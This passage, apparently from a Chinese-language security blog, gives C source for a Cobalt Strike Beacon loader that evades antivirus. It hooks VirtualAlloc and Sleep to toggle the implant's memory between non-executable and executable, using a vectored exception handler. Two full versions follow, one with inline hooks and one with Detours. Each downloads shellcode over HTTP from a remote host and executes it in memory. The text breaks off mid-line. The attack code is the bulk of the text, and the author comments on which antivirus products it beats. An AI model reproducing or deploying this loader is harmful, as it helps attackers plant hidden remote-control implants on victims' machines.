class="comment">//将偏移地址写入，跳转到新的</span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, pAllocData, <span class="keyword">sizeof</span>(pAllocData));</span><br><span class="line">	<span class="comment">//还原属性</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwAllocOldProtect, &amp;dwAllocOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//还原硬编码</span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, g_OldAllocData, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//还原属性</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Hook-Sleep"><a href="#Hook-Sleep" class="headerlink" title="Hook Sleep"></a>Hook Sleep</h5><p>在Beacon进入sleep时 即刻取消Beacon内存区域的X属性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR g_OldSleepData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">LPVOID OldSleep = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	unHookSleep();</span><br><span class="line">	Sleep(dwMilliseconds);</span><br><span class="line">	HookSleep();</span><br><span class="line">	SetEvent(hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD OldSleepProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pSleepData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//保存Sleep原编码</span></span><br><span class="line">	RtlCopyMemory(g_OldSleepData, OldSleep, <span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//计算偏移</span></span><br><span class="line">	DWORD SleepOffest = (DWORD)NewSleep - (DWORD)OldSleep - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//得到pSleepData</span></span><br><span class="line">	RtlCopyMemory(&amp;pSleepData[<span class="number">1</span>], &amp;SleepOffest, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line">	<span class="comment">//修改内存属性可写，保存原先内存属性到OldSleepProtect</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;OldSleepProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改完的pSleepData覆盖掉原始的Sleep</span></span><br><span class="line">	RtlCopyMemory(OldSleep, pSleepData, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改为原内存属性</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, OldSleepProtect, &amp;OldSleepProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//还原硬编码</span></span><br><span class="line">	RtlCopyMemory(OldSleep, g_OldSleepData, <span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//还原属性</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="VEH异常处理"><a href="#VEH异常处理" class="headerlink" title="VEH异常处理"></a>VEH异常处理</h5><p>如果内存属性为不可执行状态去执行的话，就会报出异常0xc0000005，可以通过<code>ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == 0xc0000005</code>进行判断。随后使用<code>is_Exception</code> 判断报错位置是否在申请的内存区域中，如果有在赋予可执行属性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断报错位置是否在申请的内存区域中，如果有在赋予可执行属性</span></span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo_EIP &lt; ((DWORD)BASE_ADDRESS + dwSize_Gloab) &amp;&amp; ExceptionInfo_EIP &gt;= (DWORD)BASE_ADDRESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;地址符合:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;地址不符合:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONG WINAPI <span class="title function_">VectoredExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS ExceptionInfo)</span>&#123;</span><br><span class="line">	<span class="comment">//printf(&quot;异常错误码:%x\n&quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span></span><br><span class="line">	<span class="comment">//printf(&quot;线程地址:%lx\n&quot;, ExceptionInfo-&gt;ContextRecord-&gt;Eip);</span></span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; is_Exception(ExceptionInfo-&gt;ContextRecord-&gt;Eip)) &#123;</span><br><span class="line">		<span class="comment">//printf(&quot;恢复可执行内存属性\n&quot;);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, dwSize_Gloab, PAGE_EXECUTE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinInet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;WinInet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">CHAR g_OldAllocData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">CHAR g_OldSleepData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LPVOID BASE_ADDRESS;</span><br><span class="line">SIZE_T g_dwSize;</span><br><span class="line">DWORD Beacon_OldProtect;</span><br><span class="line">HANDLE hEvent;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookVirtualAlloc</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookVirtualAlloc</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HookSleep</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookSleep</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">LPVOID OldSleep = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line">LPVOID OldVirtualAlloc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	unHookSleep();</span><br><span class="line">	Sleep(dwMilliseconds);</span><br><span class="line">	HookSleep();</span><br><span class="line">	SetEvent(hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPVOID WINAPI <span class="title function_">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> &#123;</span><br><span class="line">	unHookVirtualAlloc();</span><br><span class="line">	BASE_ADDRESS = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	g_dwSize = dwSize;</span><br><span class="line">	HookVirtualAlloc();</span><br><span class="line">	<span class="keyword">return</span> BASE_ADDRESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//参考inlinehook代码</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwAllocOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pAllocData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line">	<span class="comment">//保存原来的硬编码</span></span><br><span class="line">	RtlCopyMemory(g_OldAllocData, OldVirtualAlloc, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//计算偏移</span></span><br><span class="line">	DWORD dwAllocOffeset = (DWORD)NewVirtualAlloc - (DWORD)OldVirtualAlloc - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//得到完整的pAllocData</span></span><br><span class="line">	RtlCopyMemory(&amp;pAllocData[<span class="number">1</span>], &amp;dwAllocOffeset, <span class="keyword">sizeof</span>(dwAllocOffeset));</span><br><span class="line">	<span class="comment">//改为可写属性</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwAllocOldProtect);</span><br><span class="line">	<span class="comment">//将偏移地址写入，跳转到新的</span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, pAllocData, <span class="keyword">sizeof</span>(pAllocData));</span><br><span class="line">	<span class="comment">//还原属性</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwAllocOldProtect, &amp;dwAllocOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//还原硬编码</span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, g_OldAllocData, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//还原属性</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD OldSleepProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pSleepData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//保存Sleep原编码</span></span><br><span class="line">	RtlCopyMemory(g_OldSleepData, OldSleep, <span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//计算偏移</span></span><br><span class="line">	DWORD SleepOffest = (DWORD)NewSleep - (DWORD)OldSleep - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//得到pSleepData</span></span><br><span class="line">	RtlCopyMemory(&amp;pSleepData[<span class="number">1</span>], &amp;SleepOffest, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line">	<span class="comment">//修改内存属性可写，保存原先内存属性到OldSleepProtect</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;OldSleepProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改完的pSleepData覆盖掉原始的Sleep</span></span><br><span class="line">	RtlCopyMemory(OldSleep, pSleepData, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改为原内存属性</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, OldSleepProtect, &amp;OldSleepProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//还原硬编码</span></span><br><span class="line">	RtlCopyMemory(OldSleep, g_OldSleepData, <span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//还原属性</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断报错位置是否在申请的内存区域中，如果有在赋予可执行属性</span></span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo_EIP &lt; ((DWORD)BASE_ADDRESS + g_dwSize) &amp;&amp; ExceptionInfo_EIP &gt;= (DWORD)BASE_ADDRESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;地址符合:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;地址不符合:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONG WINAPI <span class="title function_">VectoredExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS ExceptionInfo)</span> &#123;</span><br><span class="line">	<span class="comment">//printf(&quot;异常错误码:%x\n&quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span></span><br><span class="line">	<span class="comment">//printf(&quot;线程地址:%lx\n&quot;, ExceptionInfo-&gt;ContextRecord-&gt;Eip);</span></span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; is_Exception(ExceptionInfo-&gt;ContextRecord-&gt;Eip)) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;恢复可执行内存属性\n&quot;);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_EXECUTE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">SetNoExecutableProtect</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//等待解锁</span></span><br><span class="line">		WaitForSingleObject(hEvent, INFINITE);</span><br><span class="line">		<span class="comment">//printf(&quot;设置Beacon内存属性不可执行\n&quot;);</span></span><br><span class="line">		<span class="comment">//VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_NOACCESS, &amp;Beacon_OldProtect);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//设置事件为未被通知的，重新上锁</span></span><br><span class="line">		ResetEvent(hEvent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//设置事件为有信号事件 处于通知状态</span></span><br><span class="line">	HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	AddVectoredExceptionHandler(<span class="number">1</span>, &amp;VectoredExceptionHandler);</span><br><span class="line">	HookVirtualAlloc();</span><br><span class="line">	HookSleep();</span><br><span class="line"></span><br><span class="line">	HANDLE hthread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, SetNoExecutableProtect, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hthread);</span><br><span class="line"></span><br><span class="line">	HINTERNET hInternet = InternetOpenA(<span class="string">&quot;aa&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	HINTERNET hConnect = InternetConnectA(hInternet, <span class="string">&quot;192.168.181.132&quot;</span>, <span class="number">80</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_SERVICE_HTTP, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HINTERNET hRequest = HttpOpenRequestA(hConnect, <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/shellcode&quot;</span>, <span class="string">&quot;HTTP/1.1&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_NO_CACHE_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">	HttpSendRequest(hRequest, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	LPVOID exec = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x400000</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	DWORD dwRealWord;</span><br><span class="line">	BOOL response = InternetReadFile(hRequest, exec, <span class="number">0x400000</span>, &amp;dwRealWord);</span><br><span class="line">	((<span class="type">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">	unHookSleep();</span><br><span class="line">	unHookVirtualAlloc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码还是有不足之处 当有别的行为去申请内存，会导致之前的Beacon的内存位置被覆盖掉，在is_Exception有出现问题导致无法上线</p>
<p>该方法可以勉强过windowsdefender 使用敏感动作还是会被杀，还是会识别出cs的特征</p>
<p>由于是使用的远程加载，卡巴禁止远程下载功能 所以也没法过。</p>
<p>使用detours代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinInet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/detours.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;WinInet.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _x64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;lib.X64/detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;lib.X86/detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">LPVOID BASE_ADDRESS;</span><br><span class="line">SIZE_T g_dwSize;</span><br><span class="line">DWORD Beacon_OldProtect;</span><br><span class="line">HANDLE hEvent;</span><br><span class="line">BOOL Vir_FLAG = TRUE;</span><br><span class="line">LPVOID shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UnHook</span><span class="params">()</span>;</span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span>;</span><br><span class="line"><span class="comment">//LPVOID OldSleep = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;Sleep&quot;);</span></span><br><span class="line"><span class="comment">//LPVOID OldVirtualAlloc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;VirtualAlloc&quot;);</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">VOID</span><span class="params">(WINAPI *OldSleep)</span><span class="params">(DWORD dwMilliseconds)</span> = Sleep;</span><br><span class="line"><span class="type">static</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI *OldVirtualAlloc)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> = VirtualAlloc;</span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (Vir_FLAG)</span><br><span class="line">	&#123;</span><br><span class="line">		VirtualFree(shellcode_addr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">		Vir_FLAG = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	Sleep(dwMilliseconds);</span><br><span class="line">	SetEvent(hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPVOID WINAPI <span class="title function_">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> &#123;</span><br><span class="line"></span><br><span class="line">	BASE_ADDRESS = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	g_dwSize = dwSize;</span><br><span class="line">	<span class="keyword">return</span> BASE_ADDRESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断报错位置是否在申请的内存区域中，如果有在赋予可执行属性</span></span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo_EIP &lt; ((DWORD)BASE_ADDRESS + g_dwSize) &amp;&amp; ExceptionInfo_EIP &gt;= (DWORD)BASE_ADDRESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;地址符合:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;地址不符合:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONG WINAPI <span class="title function_">VectoredExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS ExceptionInfo)</span> &#123;</span><br><span class="line">	<span class="comment">//printf(&quot;异常错误码:%x\n&quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span></span><br><span class="line">	<span class="comment">//printf(&quot;线程地址:%lx\n&quot;, ExceptionInfo-&gt;ContextRecord-&gt;Eip);</span></span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; is_Exception(ExceptionInfo-&gt;ContextRecord-&gt;Eip))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;恢复可执行内存属性\n&quot;);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_EXECUTE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">SetNoExecutableProtect</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//等待解锁</span></span><br><span class="line">		WaitForSingleObject(hEvent, INFINITE);</span><br><span class="line">		<span class="comment">//printf(&quot;设置Beacon内存属性不可执行\n&quot;);</span></span><br><span class="line">		<span class="comment">//VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_NOACCESS, &amp;Beacon_OldProtect);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, g_dwSize, PAGE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//设置事件为未被通知的，重新上锁</span></span><br><span class="line">		ResetEvent(hEvent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Hook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DetourRestoreAfterWith(); <span class="comment">//避免重复HOOK</span></span><br><span class="line">	DetourTransactionBegin(); <span class="comment">// 开始HOOK</span></span><br><span class="line">	DetourUpdateThread(GetCurrentThread());</span><br><span class="line">	DetourAttach((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	DetourAttach((PVOID*)&amp;OldSleep, NewSleep);</span><br><span class="line">	DetourTransactionCommit(); <span class="comment">//  提交HOOK</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UnHook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DetourTransactionBegin();</span><br><span class="line">	DetourUpdateThread(GetCurrentThread());</span><br><span class="line">	DetourDetach((PVOID*)&amp;OldVirtualAlloc, NewVirtualAlloc);</span><br><span class="line">	DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//设置事件为有信号事件 处于通知状态</span></span><br><span class="line">	HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">	AddVectoredExceptionHandler(<span class="number">1</span>, &amp;VectoredExceptionHandler);</span><br><span class="line">	Hook();</span><br><span class="line"></span><br><span class="line">	HANDLE hthread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, SetNoExecutableProtect, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hthread);</span><br><span class="line"></span><br><span class="line">	HINTERNET hInternet = InternetOpenA(<span class="string">&quot;aa&quot;</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	HINTERNET hConnect = InternetConnectA(hInternet, <span class="string">&quot;192.168.181.132&quot;</span>, <span class="number">80</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_SERVICE_HTTP, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HINTERNET hRequest = HttpOpenRequestA(hConnect, <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/shellcode&quot;</span>, <span class="string">&quot;HTTP/1.1&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_NO_CACHE_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">	HttpSendRequest(hRequest, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span 